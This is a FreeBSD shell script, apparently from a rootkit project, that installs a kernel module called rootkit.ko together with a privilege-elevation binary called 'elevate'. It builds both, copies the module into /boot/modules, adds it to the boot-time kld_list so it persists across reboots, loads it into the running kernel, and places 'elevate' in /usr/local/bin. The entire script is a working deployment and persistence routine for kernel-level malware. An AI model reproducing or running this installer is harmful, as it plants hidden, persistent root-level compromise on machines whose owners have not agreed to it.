#!/bin/sh

set -eu

PROJECT_DIR=$(CDPATH= cd -P "$(dirname "$0")" && pwd)

MODULE_DIR="$PROJECT_DIR/kernel"
USERSPACE_DIR="$PROJECT_DIR/user"
PERSISTENCE_DIR="/boot/modules"

MODULE_FILE="$MODULE_DIR/rootkit.ko"
PERSISTENCE_FILE="$PERSISTENCE_DIR/rootkit.ko"

ELEVATE_SRC="$USERSPACE_DIR/elevate.c"
ELEVATE_BIN="$USERSPACE_DIR/elevate"

fail()
{
	printf 'Error: %s\n' "$*" >&2
	exit 1
}


# Checks for root privileges, FreeBSD OS, and required commands
[ "$(id -u)" -eq 0 ] || fail "Run this script as root"
[ "$(uname -s)" = "FreeBSD" ] || fail "This script is intended for FreeBSD only"
[ -d "$MODULE_DIR" ] || fail "Kernel directory not found: $MODULE_DIR"
[ -f "$ELEVATE_SRC" ] || fail "Source file not found: $ELEVATE_SRC"


# Check dependencies
for command in make kldload kldstat cc install sysrc; do
    command -v "$command" >/dev/null 2>&1 ||
        fail "Required command not found: $command"
done


# Build rootkit.ko
make -C "$MODULE_DIR"
[ -f "$MODULE_FILE" ] || fail "build could not create $MODULE_FILE"


# Build elevate
cc -Wall -Wextra -o "$ELEVATE_BIN" "$ELEVATE_SRC" || fail "Failed to build elevate"


# Ensures persistence 
install -d -m 755 "$PERSISTENCE_DIR" ||
    fail "Failed to create $PERSISTENCE_DIR"

install -m 555 "$MODULE_FILE" "$PERSISTENCE_FILE" ||
    fail "Failed to install $PERSISTENCE_FILE"


# Add rootkit to kld_list without duplicating existing entries
sysrc kld_list+=rootkit >/dev/null ||
    fail "Failed to configure module loading at boot"

# Load it during the current boot
if kldstat -q -m rootkit >/dev/null 2>&1; then
    printf '%s\n' '[*] rootkit.ko is already loaded'
else
    kldload "$PERSISTENCE_FILE" ||
        fail "Failed to load $PERSISTENCE_FILE"
fi


# Check if rootkit.ko is loaded
kldstat -q -m rootkit >/dev/null 2>&1 ||
	fail "rootkit.ko was not found in the kernel module list after loading"


# Verify elevate was built successfully
[ -f "$ELEVATE_BIN" ] || fail "Build did not create $ELEVATE_BIN"
[ -x "$ELEVATE_BIN" ] || fail "$ELEVATE_BIN is not executable"


# Install elevate
install -d -m 755 /usr/local/bin ||
    fail "Failed to create /usr/local/bin"

install -m 755 "$ELEVATE_BIN" /usr/local/bin/elevate ||
    fail "Failed to install elevate"


# Print completion message
kldstat -m rootkit
printf '%s\n' '[*] Unload with: kldunload rootkit'
